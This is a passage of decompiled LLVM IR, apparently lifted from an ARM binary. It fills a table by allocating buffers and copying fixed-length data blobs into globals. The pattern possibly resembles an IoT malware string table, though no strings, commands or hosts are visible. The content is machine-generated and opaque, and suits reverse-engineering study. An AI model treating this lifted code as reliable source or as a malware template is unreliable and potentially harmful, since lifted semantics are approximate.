  %v0_11d80 = call i32 @malloc()
  %v0_11d88 = load i32, i32* @sl, align 4
  store i32 %v0_11d80, i32* @r5, align 4
  %v4_11d90 = call i32 @util_memcpy(i32 %v0_11d80, i32 ptrtoint ([9 x i8]* @global_var_1ba48.620 to i32), i32 %v0_11d88)
  %v0_11d94 = load i32, i32* @r6, align 4
  store i32 %v0_11d94, i32* @r0, align 4
  %v0_11d98 = load i32, i32* @r5, align 4
  store i32 %v0_11d98, i32* @global_var_2720c.621, align 4
  %v0_11d9c = load i32, i32* @sl, align 4
  %v1_11d9c = trunc i32 %v0_11d9c to i16
  store i16 %v1_11d9c, i16* bitcast (i32* @global_var_27210.622 to i16*), align 4
  %v0_11da0 = call i32 @malloc()
  %v0_11da4 = load i32, i32* @r6, align 4
  store i32 %v0_11da0, i32* @r5, align 4
  %v3_11db0 = call i32 @util_memcpy(i32 %v0_11da0, i32 ptrtoint (i32* @global_var_1ba54.624 to i32), i32 %v0_11da4)
  %v0_11db4 = load i32, i32* @fp, align 4
  store i32 %v0_11db4, i32* @r0, align 4
  %v0_11db8 = load i32, i32* @r5, align 4
  store i32 %v0_11db8, i32* @global_var_27214.625, align 4
  %v0_11dbc = load i32, i32* @r6, align 4
  %v1_11dbc = trunc i32 %v0_11dbc to i16
  store i16 %v1_11dbc, i16* bitcast (i32* @global_var_27218.626 to i16*), align 4
  %v0_11dc0 = call i32 @malloc()
  %v0_11dc8 = load i32, i32* @fp, align 4
  store i32 %v0_11dc0, i32* @r5, align 4
  %v3_11dd0 = call i32 @util_memcpy(i32 %v0_11dc0, i32 ptrtoint (i32* @global_var_1ba64.628 to i32), i32 %v0_11dc8)
  store i32 23, i32* @r0, align 4
  %v0_11dd8 = load i32, i32* @r5, align 4
  store i32 %v0_11dd8, i32* @global_var_2721c.629, align 4
  %v0_11ddc = load i32, i32* @fp, align 4
  %v1_11ddc = trunc i32 %v0_11ddc to i16
  store i16 %v1_11ddc, i16* bitcast (i32* @global_var_27220.630 to i16*), align 4
  %v0_11de0 = call i32 @malloc()
  store i32 %v0_11de0, i32* @r5, align 4
  %v3_11df0 = call i32 @util_memcpy(i32 %v0_11de0, i32 ptrtoint (i32* @global_var_1ba78.632 to i32), i32 23)
  store i32 24, i32* @r0, align 4
  %v0_11dfc = load i32, i32* @r5, align 4
  store i32 %v0_11dfc, i32* @global_var_27224.633, align 4
  store i16 23, i16* bitcast (i32* @global_var_27228.634 to i16*), align 4
  %v0_11e04 = call i32 @malloc()
  %v0_11e10 = load i32, i32* @r6, align 4
  %v1_11e10 = add i32 %v0_11e10, 10
  store i32 %v1_11e10, i32* @r6, align 4
  store i32 %v0_11e04, i32* @r5, align 4
  %v3_11e18 = call i32 @util_memcpy(i32 %v0_11e04, i32 ptrtoint (i32* @global_var_1ba90.636 to i32), i32 24)
  store i32 15, i32* @r0, align 4
  %v0_11e20 = load i32, i32* @r5, align 4
  store i32 %v0_11e20, i32* @global_var_2722c.637, align 4
  %v0_11e24 = load i32, i32* @r6, align 4
  %v1_11e24 = trunc i32 %v0_11e24 to i16
  store i16 %v1_11e24, i16* bitcast (i32* @global_var_27230.638 to i16*), align 4
  %v0_11e28 = call i32 @malloc()
  store i32 %v0_11e28, i32* @r5, align 4
  %v3_11e38 = call i32 @util_memcpy(i32 %v0_11e28, i32 ptrtoint (i32* @global_var_1baac.640 to i32), i32 15)
  %v0_11e40 = load i32, i32* @r8, align 4
  store i32 %v0_11e40, i32* @r0, align 4
  store i16 15, i16* bitcast (i32* @global_var_27238.641 to i16*), align 4
  %v0_11e48 = load i32, i32* @r5, align 4
  store i32 %v0_11e48, i32* @global_var_27234.642, align 4
  %v0_11e4c = call i32 @malloc()
  %v0_11e50 = load i32, i32* @r8, align 4
  store i32 %v0_11e4c, i32* @r5, align 4
  %v4_11e5c = call i32 @util_memcpy(i32 %v0_11e4c, i32 ptrtoint ([7 x i8]* @global_var_1babc.644 to i32), i32 %v0_11e50)
  %v0_11e60 = load i32, i32* @r7, align 4
  store i32 %v0_11e60, i32* @r0, align 4
  %v0_11e64 = load i32, i32* @r5, align 4
  store i32 %v0_11e64, i32* @global_var_2723c.645, align 4
  %v0_11e68 = load i32, i32* @r8, align 4
  %v1_11e68 = trunc i32 %v0_11e68 to i16
  store i16 %v1_11e68, i16* bitcast (i32* @global_var_27240.646 to i16*), align 4
  %v0_11e6c = call i32 @malloc()
  %v0_11e70 = load i32, i32* @r7, align 4
  store i32 %v0_11e6c, i32* @r5, align 4
  %v4_11e7c = call i32 @util_memcpy(i32 %v0_11e6c, i32 ptrtoint ([8 x i8]* @global_var_1bac4.648 to i32), i32 %v0_11e70)
  %v0_11e80 = load i32, i32* @r7, align 4
  store i32 %v0_11e80, i32* @r0, align 4
  %v0_11e84 = load i32, i32* @r5, align 4
  store i32 %v0_11e84, i32* @global_var_27244.649, align 4
  %v1_11e88 = trunc i32 %v0_11e80 to i16
  store i16 %v1_11e88, i16* bitcast (i32* @global_var_27248.650 to i16*), align 4
  %v0_11e8c = call i32 @malloc()
  %v0_11e90 = load i32, i32* @r7, align 4
  store i32 %v0_11e8c, i32* @r5, align 4
  %v4_11e9c = call i32 @util_memcpy(i32 %v0_11e8c, i32 ptrtoint ([8 x i8]* @global_var_1bacc.652 to i32), i32 %v0_11e90)
  store i32 3, i32* @r0, align 4
  %v0_11ea4 = load i32, i32* @r5, align 4
  store i32 %v0_11ea4, i32* @global_var_2724c.653, align 4
  %v0_11ea8 = load i32, i32* @r7, align 4
  %v1_11ea8 = trunc i32 %v0_11ea8 to i16
  store i16 %v1_11ea8, i16* bitcast (i32* @global_var_27250.654 to i16*), align 4
  %v0_11eac = call i32 @malloc()
  store i32 %v0_11eac, i32* @r5, align 4
  %v4_11ebc = call i32 @util_memcpy(i32 %v0_11eac, i32 ptrtoint ([4 x i8]* @global_var_1bad4.656 to i32), i32 3)
  %v0_11ec4 = load i32, i32* @r6, align 4
  store i32 %v0_11ec4, i32* @r0, align 4
  %v0_11ec8 = load i32, i32* @r5, align 4
  store i32 %v0_11ec8, i32* @global_var_27254.657, align 4
  store i16 3, i16* bitcast (i32* @global_var_27258.658 to i16*), align 4
  %v0_11ed0 = call i32 @malloc()
  %v0_11ed4 = load i32, i32* @r6, align 4
  store i32 %v0_11ed0, i32* @r5, align 4
  %v3_11ee0 = call i32 @util_memcpy(i32 %v0_11ed0, i32 ptrtoint (i32* @global_var_1bad8.660 to i32), i32 %v0_11ed4)
  store i32 29, i32* @r0, align 4
  %v0_11ee8 = load i32, i32* @r5, align 4
  store i32 %v0_11ee8, i32* @global_var_2725c.661, align 4
  %v0_11eec = load i32, i32* @r6, align 4
  %v1_11eec = trunc i32 %v0_11eec to i16
  store i16 %v1_11eec, i16* bitcast (i32* @global_var_27260.662 to i16*), align 4
  %v0_11ef0 = call i32 @malloc()
  store i32 %v0_11ef0, i32* @r5, align 4
  %v3_11f00 = call i32 @util_memcpy(i32 %v0_11ef0, i32 ptrtoint (i32* @global_var_1baf4.664 to i32), i32 29)
  %v0_11f08 = load i32, i32* @sb, align 4
  store i32 %v0_11f08, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_27268.665 to i16*), align 4
  %v0_11f10 = load i32, i32* @r5, align 4
  store i32 %v0_11f10, i32* @global_var_27264.666, align 4
  %v0_11f14 = call i32 @malloc()
  %v0_11f1c = load i32, i32* @sb, align 4
  store i32 %v0_11f14, i32* @r5, align 4
  %v4_11f24 = call i32 @util_memcpy(i32 %v0_11f14, i32 ptrtoint ([10 x i8]* @global_var_1bb14.668 to i32), i32 %v0_11f1c)
  %v0_11f28 = load i32, i32* @sl, align 4
  store i32 %v0_11f28, i32* @r0, align 4
  %v0_11f2c = load i32, i32* @r5, align 4
  store i32 %v0_11f2c, i32* @global_var_2726c.669, align 4
  %v0_11f30 = load i32, i32* @sb, align 4
  %v1_11f30 = trunc i32 %v0_11f30 to i16
  store i16 %v1_11f30, i16* bitcast (i32* @global_var_27270.670 to i16*), align 4
  %v0_11f34 = call i32 @malloc()
  %v0_11f3c = load i32, i32* @sl, align 4
  store i32 %v0_11f34, i32* @r5, align 4
  %v4_11f44 = call i32 @util_memcpy(i32 %v0_11f34, i32 ptrtoint ([9 x i8]* @global_var_1ba48.620 to i32), i32 %v0_11f3c)
  store i32 5, i32* @r0, align 4
  %v0_11f4c = load i32, i32* @r5, align 4
  store i32 %v0_11f4c, i32* @global_var_27274.671, align 4
  %v0_11f50 = load i32, i32* @sl, align 4
  %v1_11f50 = trunc i32 %v0_11f50 to i16
  store i16 %v1_11f50, i16* bitcast (i32* @global_var_27278.672 to i16*), align 4
  %v0_11f54 = call i32 @malloc()
  store i32 %v0_11f54, i32* @r5, align 4
  %v4_11f64 = call i32 @util_memcpy(i32 %v0_11f54, i32 ptrtoint ([6 x i8]* @global_var_1bb20.674 to i32), i32 5)
  %v0_11f6c = load i32, i32* @r8, align 4
  store i32 %v0_11f6c, i32* @r0, align 4
  %v0_11f70 = load i32, i32* @r5, align 4
  store i32 %v0_11f70, i32* @global_var_2727c.675, align 4
  store i16 5, i16* bitcast (i32* @global_var_27280.676 to i16*), align 4
  %v0_11f78 = call i32 @malloc()
  %v0_11f7c = load i32, i32* @r8, align 4
  store i32 %v0_11f78, i32* @r5, align 4
  %v4_11f88 = call i32 @util_memcpy(i32 %v0_11f78, i32 ptrtoint ([7 x i8]* @global_var_1bb28.678 to i32), i32 %v0_11f7c)
  store i32 21, i32* @r0, align 4
  %v0_11f90 = load i32, i32* @r5, align 4
  store i32 %v0_11f90, i32* @global_var_27284.679, align 4
  %v0_11f94 = load i32, i32* @r8, align 4
  %v1_11f94 = trunc i32 %v0_11f94 to i16
  store i16 %v1_11f94, i16* bitcast (i32* @global_var_27288.680 to i16*), align 4
  %v0_11f98 = call i32 @malloc()
  store i32 %v0_11f98, i32* @r5, align 4
  %v0_11fa8 = load i32, i32* @r8, align 4
  %v1_11fa8 = add i32 %v0_11fa8, 15
  store i32 %v1_11fa8, i32* @r8, align 4
  %v3_11fac = call i32 @util_memcpy(i32 %v0_11f98, i32 ptrtoint (i32* @global_var_1bb30.682 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  %v0_11fb8 = load i32, i32* @r8, align 4
  %v1_11fb8 = trunc i32 %v0_11fb8 to i16
  %v2_11fb8 = load i32, i32* @r4, align 4
  %v4_11fb8 = add i32 %v2_11fb8, 260
  %v5_11fb8 = inttoptr i32 %v4_11fb8 to i16*
  store i16 %v1_11fb8, i16* %v5_11fb8, align 2
  %v0_11fbc = load i32, i32* @r5, align 4
  store i32 %v0_11fbc, i32* @global_var_2728c.683, align 4
  %v0_11fc0 = call i32 @malloc()
  store i32 %v0_11fc0, i32* @r5, align 4
  %v3_11fd0 = call i32 @util_memcpy(i32 %v0_11fc0, i32 ptrtoint (i32* @global_var_1bb48.685 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  %v2_11fe0 = load i32, i32* @r4, align 4
  %v4_11fe0 = add i32 %v2_11fe0, 268
  %v5_11fe0 = inttoptr i32 %v4_11fe0 to i16*
  store i16 17, i16* %v5_11fe0, align 2
  %v0_11fe4 = load i32, i32* @r5, align 4
  store i32 %v0_11fe4, i32* @global_var_27294.686, align 4
  %v0_11fe8 = call i32 @malloc()
  %v0_11ff4 = load i32, i32* @r7, align 4
  %v1_11ff4 = add i32 %v0_11ff4, 4
  store i32 %v1_11ff4, i32* @r7, align 4
  store i32 %v0_11fe8, i32* @r5, align 4
  %v4_11ffc = call i32 @util_memcpy(i32 %v0_11fe8, i32 ptrtoint ([12 x i8]* @global_var_1bb5c.688 to i32), i32 11)
  store i32 23, i32* @r0, align 4
  %v0_12008 = load i32, i32* @r7, align 4
  %v1_12008 = trunc i32 %v0_12008 to i16
  %v2_12008 = load i32, i32* @r4, align 4
  %v4_12008 = add i32 %v2_12008, 276
  %v5_12008 = inttoptr i32 %v4_12008 to i16*
  store i16 %v1_12008, i16* %v5_12008, align 2
  %v0_1200c = load i32, i32* @r5, align 4
  store i32 %v0_1200c, i32* @global_var_2729c.689, align 4
  %v0_12010 = call i32 @malloc()
  store i32 %v0_12010, i32* @r5, align 4
  %v3_12020 = call i32 @util_memcpy(i32 %v0_12010, i32 ptrtoint (i32* @global_var_1bb68.691 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_12030 = load i32, i32* @r4, align 4
  %v4_12030 = add i32 %v2_12030, 284
  %v5_12030 = inttoptr i32 %v4_12030 to i16*
  store i16 23, i16* %v5_12030, align 2
  %v0_12034 = load i32, i32* @r5, align 4
  store i32 %v0_12034, i32* @global_var_272a4.692, align 4
  %v0_12038 = call i32 @malloc()
  store i32 %v0_12038, i32* @r5, align 4
  %v3_12048 = call i32 @util_memcpy(i32 %v0_12038, i32 ptrtoint (i32* @global_var_1bebc.694 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_12058 = load i32, i32* @r4, align 4
  %v4_12058 = add i32 %v2_12058, 292
  %v5_12058 = inttoptr i32 %v4_12058 to i16*
  store i16 83, i16* %v5_12058, align 2
  %v0_1205c = load i32, i32* @r5, align 4
  store i32 %v0_1205c, i32* @global_var_272ac.695, align 4
  %v0_12060 = call i32 @malloc()
  store i32 %v0_12060, i32* @r5, align 4
  %v3_12070 = call i32 @util_memcpy(i32 %v0_12060, i32 ptrtoint (i32* @global_var_1bf10.697 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_12080 = load i32, i32* @r4, align 4
  %v4_12080 = add i32 %v2_12080, 300
  %v5_12080 = inttoptr i32 %v4_12080 to i16*
  store i16 32, i16* %v5_12080, align 2
  %v0_12084 = load i32, i32* @r5, align 4
  store i32 %v0_12084, i32* @global_var_272b4.698, align 4
  %v0_12088 = call i32 @malloc()
  store i32 %v0_12088, i32* @r5, align 4
  %v3_12098 = call i32 @util_memcpy(i32 %v0_12088, i32 ptrtoint (i32* @global_var_1bb80.700 to i32), i32 48)
  store i32 12, i32* @r0, align 4
  %v2_120a8 = load i32, i32* @r4, align 4
  %v4_120a8 = add i32 %v2_120a8, 308
  %v5_120a8 = inttoptr i32 %v4_120a8 to i16*
  store i16 48, i16* %v5_120a8, align 2
  %v0_120ac = load i32, i32* @r5, align 4
  store i32 %v0_120ac, i32* @global_var_272bc.701, align 4
  %v0_120b0 = call i32 @malloc()
  %v0_120bc = load i32, i32* @r6, align 4
  %v1_120bc = add i32 %v0_120bc, -12
  store i32 %v1_120bc, i32* @r6, align 4
  store i32 %v0_120b0, i32* @r5, align 4
  %v3_120c4 = call i32 @util_memcpy(i32 %v0_120b0, i32 ptrtoint (i32* @global_var_1bbb4.703 to i32), i32 12)
  %v0_120cc = load i32, i32* @sb, align 4
  store i32 %v0_120cc, i32* @r0, align 4
  %v0_120d0 = load i32, i32* @r6, align 4
  %v1_120d0 = trunc i32 %v0_120d0 to i16
  %v2_120d0 = load i32, i32* @r4, align 4
  %v4_120d0 = add i32 %v2_120d0, 316
  %v5_120d0 = inttoptr i32 %v4_120d0 to i16*
  store i16 %v1_120d0, i16* %v5_120d0, align 2
  %v0_120d4 = load i32, i32* @r5, align 4
  store i32 %v0_120d4, i32* @global_var_272c4.704, align 4
  %v0_120d8 = call i32 @malloc()
  %v0_120e0 = load i32, i32* @sb, align 4
  store i32 %v0_120d8, i32* @r5, align 4
  %v3_120e8 = call i32 @util_memcpy(i32 %v0_120d8, i32 ptrtoint (i32* @global_var_1bbc4.706 to i32), i32 %v0_120e0)
  store i32 10, i32* @r0, align 4
  %v0_120f4 = load i32, i32* @sb, align 4
  %v1_120f4 = trunc i32 %v0_120f4 to i16
  %v2_120f4 = load i32, i32* @r4, align 4
  %v4_120f4 = add i32 %v2_120f4, 324
  %v5_120f4 = inttoptr i32 %v4_120f4 to i16*
  store i16 %v1_120f4, i16* %v5_120f4, align 2
  %v0_120f8 = load i32, i32* @r5, align 4
  store i32 %v0_120f8, i32* @global_var_272cc.707, align 4
  %v0_120fc = call i32 @malloc()
  store i32 %v0_120fc, i32* @r5, align 4
  %v3_1210c = call i32 @util_memcpy(i32 %v0_120fc, i32 ptrtoint (i32* @global_var_1bbd0.709 to i32), i32 10)
  %v0_12118 = load i32, i32* @r6, align 4
  store i32 %v0_12118, i32* @r0, align 4
  %v2_1211c = load i32, i32* @r4, align 4
  %v4_1211c = add i32 %v2_1211c, 332
  %v5_1211c = inttoptr i32 %v4_1211c to i16*
  store i16 10, i16* %v5_1211c, align 2
  %v0_12120 = load i32, i32* @r5, align 4
  store i32 %v0_12120, i32* @global_var_272d4.710, align 4
  %v0_12124 = call i32 @malloc()
  %v0_12128 = load i32, i32* @r6, align 4
  store i32 %v0_12124, i32* @r5, align 4
  %v3_12134 = call i32 @util_memcpy(i32 %v0_12124, i32 ptrtoint (i32* @global_var_1bbdc.712 to i32), i32 %v0_12128)
  store i32 16, i32* @r0, align 4
  %v0_12140 = load i32, i32* @r6, align 4
  %v1_12140 = trunc i32 %v0_12140 to i16
  %v2_12140 = load i32, i32* @r4, align 4
  %v4_12140 = add i32 %v2_12140, 340
  %v5_12140 = inttoptr i32 %v4_12140 to i16*
  store i16 %v1_12140, i16* %v5_12140, align 2
  %v0_12144 = load i32, i32* @r5, align 4
  store i32 %v0_12144, i32* @global_var_272dc.713, align 4
  %v0_12148 = call i32 @malloc()
  store i32 %v0_12148, i32* @r5, align 4
  %v3_12158 = call i32 @util_memcpy(i32 %v0_12148, i32 ptrtoint (i32* @global_var_1bbec.715 to i32), i32 16)
  %v0_12164 = load i32, i32* @fp, align 4
  store i32 %v0_12164, i32* @r0, align 4
  %v2_12168 = load i32, i32* @r4, align 4
  %v4_12168 = add i32 %v2_12168, 348
  %v5_12168 = inttoptr i32 %v4_12168 to i16*
  store i16 16, i16* %v5_12168, align 2
  %v0_1216c = load i32, i32* @r5, align 4
  store i32 %v0_1216c, i32* @global_var_272e4.716, align 4
  %v0_12170 = call i32 @malloc()
  %v0_12178 = load i32, i32* @fp, align 4
  store i32 %v0_12170, i32* @r5, align 4
  %v3_12180 = call i32 @util_memcpy(i32 %v0_12170, i32 ptrtoint (i32* @global_var_1bc00.718 to i32), i32 %v0_12178)
  %v0_12188 = load i32, i32* @sl, align 4
  store i32 %v0_12188, i32* @r0, align 4
  %v0_1218c = load i32, i32* @fp, align 4
  %v1_1218c = trunc i32 %v0_1218c to i16
  %v2_1218c = load i32, i32* @r4, align 4
  %v4_1218c = add i32 %v2_1218c, 356
  %v5_1218c = inttoptr i32 %v4_1218c to i16*
  store i16 %v1_1218c, i16* %v5_1218c, align 2
  %v0_12190 = load i32, i32* @r5, align 4
  store i32 %v0_12190, i32* @global_var_272ec.719, align 4
  %v0_12194 = call i32 @malloc()
  %v0_1219c = load i32, i32* @sl, align 4
  store i32 %v0_12194, i32* @r5, align 4
  %v4_121a4 = call i32 @util_memcpy(i32 %v0_12194, i32 ptrtoint ([9 x i8]* @global_var_1bc14.721 to i32), i32 %v0_1219c)
  %v0_121ac = load i32, i32* @r7, align 4
  store i32 %v0_121ac, i32* @r0, align 4
  %v0_121b0 = load i32, i32* @sl, align 4
  %v1_121b0 = trunc i32 %v0_121b0 to i16
  %v2_121b0 = load i32, i32* @r4, align 4
  %v4_121b0 = add i32 %v2_121b0, 364
  %v5_121b0 = inttoptr i32 %v4_121b0 to i16*
  store i16 %v1_121b0, i16* %v5_121b0, align 2
  %v0_121b4 = load i32, i32* @r5, align 4
  store i32 %v0_121b4, i32* @global_var_272f4.722, align 4
  %v0_121b8 = call i32 @malloc()
  %v0_121c0 = load i32, i32* @r7, align 4
  store i32 %v0_121b8, i32* @r5, align 4
  %v3_121c8 = call i32 @util_memcpy(i32 %v0_121b8, i32 ptrtoint (i32* @global_var_1bb74.724 to i32), i32 %v0_121c0)
  %v0_121d0 = load i32, i32* @r6, align 4
  store i32 %v0_121d0, i32* @r0, align 4
  %v0_121d4 = load i32, i32* @r7, align 4
  %v1_121d4 = trunc i32 %v0_121d4 to i16
  %v2_121d4 = load i32, i32* @r4, align 4
  %v4_121d4 = add i32 %v2_121d4, 372
  %v5_121d4 = inttoptr i32 %v4_121d4 to i16*
  store i16 %v1_121d4, i16* %v5_121d4, align 2
  %v0_121d8 = load i32, i32* @r5, align 4
  store i32 %v0_121d8, i32* @global_var_272fc.725, align 4
  %v0_121dc = call i32 @malloc()
  %v0_121e0 = load i32, i32* @r6, align 4
  store i32 %v0_121dc, i32* @r5, align 4
  %v3_121ec = call i32 @util_memcpy(i32 %v0_121dc, i32 ptrtoint (i32* @global_var_1bc20.727 to i32), i32 %v0_121e0)
  store i32 18, i32* @r0, align 4
  %v0_121f8 = load i32, i32* @r6, align 4
  %v1_121f8 = trunc i32 %v0_121f8 to i16
  %v2_121f8 = load i32, i32* @r4, align 4
  %v4_121f8 = add i32 %v2_121f8, 380
  %v5_121f8 = inttoptr i32 %v4_121f8 to i16*
  store i16 %v1_121f8, i16* %v5_121f8, align 2
  %v0_121fc = load i32, i32* @r5, align 4
  store i32 %v0_121fc, i32* @global_var_27304.728, align 4
  %v0_12200 = call i32 @malloc()
  store i32 %v0_12200, i32* @r5, align 4
  %v3_12210 = call i32 @util_memcpy(i32 %v0_12200, i32 ptrtoint (i32* @global_var_1bc30.730 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_12220 = load i32, i32* @r4, align 4
  %v4_12220 = add i32 %v2_12220, 388
  %v5_12220 = inttoptr i32 %v4_12220 to i16*
  store i16 18, i16* %v5_12220, align 2
  %v0_12224 = load i32, i32* @r5, align 4
  store i32 %v0_12224, i32* @global_var_2730c.731, align 4
  %v0_12228 = call i32 @malloc()
  store i32 %v0_12228, i32* %r5.global-to-local, align 4
  %v3_12238 = call i32 @util_memcpy(i32 %v0_12228, i32 ptrtoint (i32* @global_var_1bc44.733 to i32), i32 25)
  store i32 115, i32* @r0, align 4
  %v2_12248 = load i32, i32* @r4, align 4
  %v4_12248 = add i32 %v2_12248, 396
  %v5_12248 = inttoptr i32 %v4_12248 to i16*
  store i16 25, i16* %v5_12248, align 2
  %v0_1224c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1224c, i32* @global_var_27314.734, align 4
  %v0_12250 = load i32, i32* @r0, align 4
  store i32 %v0_12250, i32* @r5, align 4
  %v0_12254 = call i32 @malloc()
  %v0_12258 = load i32, i32* @r5, align 4
  store i32 %v0_12254, i32* @r6, align 4
  %v3_12264 = call i32 @util_memcpy(i32 %v0_12254, i32 ptrtoint (i32* @global_var_1bc60.736 to i32), i32 %v0_12258)
  %v0_1226c = load i32, i32* @r5, align 4
  store i32 %v0_1226c, i32* @r0, align 4
  %v1_12270 = trunc i32 %v0_1226c to i16
  %v2_12270 = load i32, i32* @r4, align 4
  %v4_12270 = add i32 %v2_12270, 404
  %v5_12270 = inttoptr i32 %v4_12270 to i16*
  store i16 %v1_12270, i16* %v5_12270, align 2
  %v0_12274 = load i32, i32* @r6, align 4
  store i32 %v0_12274, i32* @global_var_2731c.737, align 4
  %v0_12278 = call i32 @malloc()
  %v0_1227c = load i32, i32* @r5, align 4
  store i32 %v0_12278, i32* @r6, align 4
  %v3_12288 = call i32 @util_memcpy(i32 %v0_12278, i32 ptrtoint (i32* @global_var_1bcd4.739 to i32), i32 %v0_1227c)
  store i32 79, i32* @r0, align 4
  %v0_12294 = load i32, i32* @r5, align 4
  %v1_12294 = trunc i32 %v0_12294 to i16
  %v2_12294 = load i32, i32* @r4, align 4
  %v4_12294 = add i32 %v2_12294, 412
  %v5_12294 = inttoptr i32 %v4_12294 to i16*
  store i16 %v1_12294, i16* %v5_12294, align 2
  %v0_12298 = load i32, i32* @r6, align 4
  store i32 %v0_12298, i32* @global_var_27324.740, align 4
  %v0_1229c = call i32 @malloc()
  store i32 %v0_1229c, i32* %r5.global-to-local, align 4
  %v3_122ac = call i32 @util_memcpy(i32 %v0_1229c, i32 ptrtoint (i32* @global_var_1bd48.742 to i32), i32 79)
  store i32 114, i32* @r0, align 4
  %v2_122bc = load i32, i32* @r4, align 4
  %v4_122bc = add i32 %v2_122bc, 420
  %v5_122bc = inttoptr i32 %v4_122bc to i16*
  store i16 79, i16* %v5_122bc, align 2
  %v0_122c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_122c0, i32* @global_var_2732c.743, align 4
  %v0_122c4 = load i32, i32* @r0, align 4
  store i32 %v0_122c4, i32* @r5, align 4
  %v0_122c8 = call i32 @malloc()
  %v0_122cc = load i32, i32* @r5, align 4
  store i32 %v0_122c8, i32* @r6, align 4
  %v3_122d8 = call i32 @util_memcpy(i32 %v0_122c8, i32 ptrtoint (i32* @global_var_1bd98.745 to i32), i32 %v0_122cc)
  %v0_122e0 = load i32, i32* @r5, align 4
  store i32 %v0_122e0, i32* @r0, align 4
  %v1_122e4 = trunc i32 %v0_122e0 to i16
  %v2_122e4 = load i32, i32* @r4, align 4
  %v4_122e4 = add i32 %v2_122e4, 428
  %v5_122e4 = inttoptr i32 %v4_122e4 to i16*
  store i16 %v1_122e4, i16* %v5_122e4, align 2
  %v0_122e8 = load i32, i32* @r6, align 4
  store i32 %v0_122e8, i32* @global_var_27334.746, align 4
  %v0_122ec = call i32 @malloc()
  %v0_122f0 = load i32, i32* @r5, align 4
  store i32 %v0_122ec, i32* @r6, align 4
  %v3_122fc = call i32 @util_memcpy(i32 %v0_122ec, i32 ptrtoint (i32* @global_var_1be0c.748 to i32), i32 %v0_122f0)
  %v0_12304 = load i32, i32* @r8, align 4
  store i32 %v0_12304, i32* @r0, align 4
  %v0_12308 = load i32, i32* @r5, align 4
  %v1_12308 = trunc i32 %v0_12308 to i16
  %v2_12308 = load i32, i32* @r4, align 4
  %v4_12308 = add i32 %v2_12308, 436
  %v5_12308 = inttoptr i32 %v4_12308 to i16*
  store i16 %v1_12308, i16* %v5_12308, align 2
  %v0_1230c = load i32, i32* @r6, align 4
  store i32 %v0_1230c, i32* @global_var_2733c.749, align 4
  %v0_12310 = call i32 @malloc()
  %v0_12318 = load i32, i32* @r8, align 4
  store i32 %v0_12310, i32* @r5, align 4
  %v3_12320 = call i32 @util_memcpy(i32 %v0_12310, i32 ptrtoint (i32* @global_var_1be80.751 to i32), i32 %v0_12318)
  %v0_12328 = load i32, i32* @fp, align 4
  store i32 %v0_12328, i32* @r0, align 4
  %v0_1232c = load i32, i32* @r8, align 4
  %v1_1232c = trunc i32 %v0_1232c to i16
  %v2_1232c = load i32, i32* @r4, align 4
  %v4_1232c = add i32 %v2_1232c, 444
  %v5_1232c = inttoptr i32 %v4_1232c to i16*
  store i16 %v1_1232c, i16* %v5_1232c, align 2
  %v0_12330 = load i32, i32* @r5, align 4
  store i32 %v0_12330, i32* @global_var_27344.752, align 4
  %v0_12334 = call i32 @malloc()
  %v0_1233c = load i32, i32* @fp, align 4
  store i32 %v0_12334, i32* @r5, align 4
  %v3_12344 = call i32 @util_memcpy(i32 %v0_12334, i32 ptrtoint (i32* @global_var_1ba64.628 to i32), i32 %v0_1233c)
  store i32 23, i32* @r0, align 4
  %v0_12350 = load i32, i32* @fp, align 4
  %v1_12350 = trunc i32 %v0_12350 to i16
  %v2_12350 = load i32, i32* @r4, align 4
  %v4_12350 = add i32 %v2_12350, 452
  %v5_12350 = inttoptr i32 %v4_12350 to i16*
  store i16 %v1_12350, i16* %v5_12350, align 2
  %v0_12354 = load i32, i32* @r5, align 4
  store i32 %v0_12354, i32* @global_var_2734c.753, align 4
  %v0_12358 = call i32 @malloc()
  store i32 %v0_12358, i32* @r5, align 4
  %v3_12368 = call i32 @util_memcpy(i32 %v0_12358, i32 ptrtoint (i32* @global_var_1be98.755 to i32), i32 23)
  %v0_12374 = load i32, i32* @r7, align 4
  store i32 %v0_12374, i32* @r0, align 4
  %v2_12378 = load i32, i32* @r4, align 4
  %v4_12378 = add i32 %v2_12378, 460
  %v5_12378 = inttoptr i32 %v4_12378 to i16*
  store i16 23, i16* %v5_12378, align 2
  %v0_1237c = load i32, i32* @r5, align 4
  store i32 %v0_1237c, i32* @global_var_27354.756, align 4
  %v0_12380 = call i32 @malloc()
  %v0_12388 = load i32, i32* @r7, align 4
  store i32 %v0_12380, i32* %r5.global-to-local, align 4
  %v4_12390 = call i32 @util_memcpy(i32 %v0_12380, i32 ptrtoint ([12 x i8]* @global_var_1beb0.758 to i32), i32 %v0_12388)
  %v0_12398 = load i32, i32* @r7, align 4
  %v1_12398 = trunc i32 %v0_12398 to i16
  %v2_12398 = load i32, i32* @r4, align 4
  %v4_12398 = add i32 %v2_12398, 468
  %v5_12398 = inttoptr i32 %v4_12398 to i16*
  store i16 %v1_12398, i16* %v5_12398, align 2
  %v0_1239c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1239c, i32* @global_var_2735c.759, align 4
  store i32 %v3_11b64, i32* @r4, align 4
  store i32 %v6_11b64, i32* @r5, align 4
  store i32 %v9_11b64, i32* @r6, align 4
  store i32 %v12_11b64, i32* @r7, align 4
  store i32 %v15_11b64, i32* @r8, align 4
  store i32 %v21_11b64, i32* @sl, align 4
  store i32 %v24_11b64, i32* @fp, align 4
  ret i32 %v4_12390

; uselistorder directives
  uselistorder i32 %v0_12380, { 1, 0 }
  uselistorder i32 %v0_12334, { 1, 0 }
  uselistorder i32 %v0_12310, { 1, 0 }
  uselistorder i32 %v0_122ec, { 1, 0 }
  uselistorder i32 %v0_122c8, { 1, 0 }
  uselistorder i32 %v0_12278, { 1, 0 }
  uselistorder i32 %v0_12254, { 1, 0 }
  uselistorder i32 %v0_121dc, { 1, 0 }
  uselistorder i32 %v0_121b8, { 1, 0 }
  uselistorder i32 %v0_12194, { 1, 0 }
  uselistorder i32 %v0_12170, { 1, 0 }
  uselistorder i32 %v0_12124, { 1, 0 }
